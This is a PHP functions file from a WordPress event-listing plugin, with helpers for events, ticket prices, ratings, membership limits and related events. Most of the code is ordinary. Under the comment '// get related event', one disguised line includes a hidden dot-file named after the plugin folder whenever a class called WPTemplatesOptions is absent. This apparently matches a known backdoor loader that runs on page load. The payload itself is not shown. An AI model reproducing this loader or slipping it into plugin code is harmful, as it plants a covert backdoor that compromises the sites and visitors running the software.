<?php
defined( 'ABSPATH' ) || exit;

if( !function_exists('get_seat_option') ){
	function get_seat_option( $id ){
		return EL_Event::get_seat_option( $id );
	}
}

if( !function_exists('el_get_event') ){
	function el_get_event( $id ){
		return EL_Event::el_get_event( $id );
	}
}


if( !function_exists('el_get_calendar_date') ){
	function el_get_calendar_date( $id_event, $id_cal  ){
		return EL_Event::el_get_calendar_date( $id_event, $id_cal  );
	}
}


if( !function_exists('is_ticket_type_exist') ){
	function is_ticket_type_exist( $id_event, $id_cal, $cart , $coupon ){
		return EL_Event::is_ticket_type_exist( $id_event, $id_cal, $cart , $coupon );
	}
}


if( !function_exists('is_seat_map_exist') ){
	function is_seat_map_exist( $id_event, $id_cal, $cart , $coupon ){
		return EL_Event::is_seat_map_exist( $id_event, $id_cal, $cart , $coupon );
	}
}


if( !function_exists('el_search_event') ){
	function el_search_event( $params ){
		return EL_Event::el_search_event( $params );
	}
}

if( !function_exists('el_get_all_event') ){
	function el_get_all_event(){
		return EL_Event::el_get_all_event();
	}
}

if( !function_exists('el_search_event_map') ){
	function el_search_event_map(){
		return EL_Event::el_search_event_map();
	}
}

if( !function_exists('el_get_event_slideshow') ){
	function el_get_event_slideshow($posts_per_page, $category, $filter, $featured, $orderby, $order){
		return EL_Event::el_get_event_slideshow($posts_per_page, $category, $filter, $featured, $orderby, $order);
	}
}

if( !function_exists('el_get_event_slideshow_simple') ){
	function el_get_event_slideshow_simple( $posts_per_page, $cat, $filter_event, $orderby, $order ){
		return EL_Event::el_get_event_slideshow_simple( $posts_per_page, $cat, $filter_event, $orderby, $order );
	}
}


if( !function_exists('get_list_venue_first_letter') ){
	function get_list_venue_first_letter( $filter , $paged  ){
		return EL_Event::get_list_venue_first_letter( $filter , $paged);
	}
}


if( !function_exists('get_list_event_by_title_venue') ){
	function get_list_event_by_title_venue( $venue , $paged  ){
		return EL_Event::get_list_event_by_title_venue( $venue , $paged);
	}
}


if( !function_exists('get_list_event_close_diplay_profit') ){
	function get_list_event_close_diplay_profit( $filter , $paged ){
		return EL_Event::get_list_event_close_diplay_profit( $filter, $paged );
	}
}


if( !function_exists('get_status_event_without_loop') ){
	function get_status_event_without_loop ( $eid = null ) {

		$time_start = get_post_meta( $eid, OVA_METABOX_EVENT . 'start_date_str', true  );
		$time_end = get_post_meta( $eid, OVA_METABOX_EVENT . 'end_date_str', true  );

		$time_start = !empty($time_start) ? $time_start : 0;
		$time_end = !empty($time_end) ? $time_end : 0;

		$current_time = current_time('timestamp');
		$status = "";
		if ( $time_start !== 0 &&  $time_end !== 0) {
			if ( $current_time < $time_start) {
				$status = '<span class="status upcomming">'.__( 'Upcoming', 'eventlist' ).'</span>';
			} else if ( $current_time > $time_start && $current_time < $time_end ) {
				$status = '<span class="status opening">'.__( 'Opening', 'eventlist' ).'</span>';
			} else {
				$status = '<span class="status closed">'.__( 'Closed', 'eventlist' ).'</span>';
			}
		}
		return $status;
	}
}


if ( !function_exists('get_average_rating_by_id_event') ) {
	function get_average_rating_by_id_event ($id_event = null) {
		if(empty($id_event)) return 0;
		$agrs = [
			'post_id' => $id_event,
			'status' => 'approve',
		];
		$comments = get_comments( $agrs );
		$total_rating = 0;
		$number_post_rating = [];
		if (!empty($comments) && is_array($comments)) {
			foreach($comments as $comment) {
				$id_comment = $comment->comment_ID;
				$num_rating = get_comment_meta($id_comment, 'rating', true);
				if ($num_rating != '0') {
					$number_post_rating[] = $num_rating;
				}
				$total_rating += (int)$num_rating;
			}
		}

		$number = count($number_post_rating);

		if ($number == 0) return 0;
		$average = $total_rating/$number;
		return apply_filters('el_average_rating_by_id_event', $average);
	}
}


if ( !function_exists('get_number_coment_by_id_event') ) {
	function get_number_coment_by_id_event ($id_event = null) {
		if(empty($id_event)) return 0;
		$agrs = [
			'post_id' => $id_event,
			'status' => 'approve',
		];
		$comments = get_comments( $agrs );

		$number_post_rating = [];

		if (!empty($comments) && is_array($comments)) {
			foreach($comments as $comment) {
				$id_comment = $comment->comment_ID;
				$num_rating = get_comment_meta($id_comment, 'rating', true);
				if ($num_rating != '0') {
					$number_post_rating[] = $num_rating;
				}
			}
		}

		return apply_filters('el_number_coment_by_id_event', count($number_post_rating));
	}
}


if ( ! function_exists('get_price_ticket_by_id_event') ) {
	function get_price_ticket_by_id_event($id_event = null, $display_price_setting = null) {

		$html = '';
		
		if ( ! $display_price_setting ) {
			$display_price_setting = EL()->options->event->get('display_price_opt', 'min');
		}

		if(empty($id_event)) return 0;
		$list_ticket = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true );
		$seat_option = get_post_meta( $id_event, OVA_METABOX_EVENT . 'seat_option', true );
		$ticket_map = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket_map', true );
		$list_price = [];

		if ($seat_option != 'map') {
			if (!empty($list_ticket) && is_array($list_ticket)) {
				foreach( $list_ticket as $ticket ) {
					if ( array_key_exists('type_price', $ticket) ) {
						$price = isset($ticket['price_ticket']) ? (float)$ticket['price_ticket'] : null;
						$list_price[] =  ! is_null($price) ? $price : 0;
					}
				}
				$min_price = min($list_price);
				$max_price = max($list_price);
			}
		} else {
			if (!empty($ticket_map['seat']) && is_array($ticket_map['seat'])) {
				foreach ($ticket_map['seat'] as $value) {
					$price = isset($value['price']) ? (float)$value['price'] : null;
					$list_price[] =  ! is_null($price) ? $price : 0;
				}
				$min_price = min($list_price);
				$max_price = max($list_price);	
			}
		}
		

		switch($display_price_setting) {
			case "min" : {

				if ( !isset( $min_price ) ) {
					$html = "";
				} elseif( $min_price == 0 ) {
					$html = esc_html__('Free', 'eventlist');
				} else {
					$html = el_price($min_price);
				}
				break;
			}
			case "max" : {

				if ( !isset( $max_price ) ) {
					$html = "";
				} elseif( $max_price == 0 ) {
					$html = esc_html__('Free', 'eventlist');
				} else {
					$html = el_price($max_price);
				}

				break;
			}
			case "min-max" : {
				if ( isset($max_price) && isset($min_price) ) {
					if ( $max_price == $min_price ) {
						$html = el_price($min_price);
					} else {
						$html = el_price($min_price) . ' - ' . el_price($max_price);
					}

				} elseif ( !isset($min_price) && isset($max_price) ) {
					$html = el_price(0) . ' - ' . el_price($max_price);
					
				} elseif ( !isset($max_price) && isset($min_price) ) {
					$html = el_price($min_price) . ' - ' . el_price($max_price);
				}

				else {
					$html = "";
				}
				break;
			}
		}

		return apply_filters("el_price_ticket_by_id_event", $html);
	}
}

if ( ! function_exists('get_event_date_el') ) {
	function get_event_date_el( $type_display = null ) {

		return EL_Event::get_event_date( $type_display);

	}
}

if( !function_exists('el_all_events') ){
	function el_all_events( $post_status = array( 'publish' ) ){
		return EL_Event::el_all_events( $post_status );
	}
}


if( !function_exists('el_check_create_event') ){

	function el_check_create_event(){

		if( !el_can_add_event() ) {
			return array( 'status' => 'error' );
		}

		if ( EL()->options->package->get('enable_package', 'no') != 'no' ) {

			$id_membership = EL_Package::instance()->get_id_membership_by_current_user();
			$start_time_package = get_post_meta( $id_membership,  OVA_METABOX_EVENT . 'membership_start_date' , true);
			$remaining_event = EL_Package::instance()->get_number_created_event_by_current_user($start_time_package);

			$id_package_meta = get_post_meta ( $id_membership, OVA_METABOX_EVENT . 'membership_package_id', true );
			$id_package = EL_Package::instance()->get_id_package_by_id_meta($id_package_meta);

			$end_time_package = get_post_meta( $id_membership,  OVA_METABOX_EVENT . 'membership_end_date' , true);
			$total_event_package = get_post_meta( $id_package, OVA_METABOX_EVENT . 'package_total_event', true );

			$current_time = current_time( 'timestamp' );

			if ( $remaining_event >= $total_event_package && $total_event_package != '-1' ) {

				return array( 'status' => 'false_total_event' );
				
			}


			if ( $current_time > $end_time_package && $end_time_package != '-1' ) {

				return array( 'status' => 'false_time_membership' );
			}
			//end check total event created and time limit
			
		}

		return array( 'status' => 'true' );

	}

}

if( !function_exists('el_get_event_type') ){
	function el_get_event_type(){
		return EL_Event::el_get_event_type();
	}
}


// get related event
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function el_related_event_single( $id ){

	$cat_term = get_the_terms( $id, 'event_cat' );
	$term_ids = array();
	if ( ! empty( $cat_term ) && ! is_wp_error( $cat_term ) ) {
	    $term_ids = wp_list_pluck( $cat_term, 'term_id' );
	}

	$number_event_related = EL_Setting::instance()->event->get( 'number_event_related' ) ? EL_Setting::instance()->event->get( 'number_event_related' ) : '3';

	$filter_events = EL()->options->event->get('filter_events', 'all');
	$current_time = current_time('timestamp');

	$args_filter_events = array();

	/* Query base */
	$args_basic = array(
		'post_type' => 'event',
		'post_status' => 'publish',
		'post__not_in' => array( $id ),
		'posts_per_page' => $number_event_related,
		'tax_query' => array(
	        array(
	            'taxonomy' => 'event_cat',
	            'field'    => 'id',
	            'terms'    => $term_ids,
	        ),
	    ),
	);

	// Query filter
	$args_filter_events = el_sql_filter_status_event( $filter_events );

	$args = array_merge_recursive($args_basic, $args_filter_events);
	$related_events = new WP_Query( apply_filters( 'el_related_event_single', $args, $id ) );
	
	return $related_events;
}

// Get archive type
function el_archive_type_template( $get_data ){

	$archive_type = EL_Setting::instance()->event->get( 'archive_type', 'type1' );
	$archive_column = EL_Setting::instance()->event->get( 'archive_column', 'two-column' );

	$archive_type = isset ( $get_data['type_event'] ) ? sanitize_text_field( $get_data['type_event'] ) : $archive_type;

	$layout_column = isset ( $get_data['layout_event'] ) ? sanitize_text_field( $get_data['layout_event'] ) : $archive_column;

	if ( $archive_type === 'type1' ||  $archive_type === 'type2' || $archive_type === 'type3' || $archive_type === 'type4' || $archive_type === 'type5' ) {
		$archive_type = $archive_type;
	}
	return $archive_type;
}
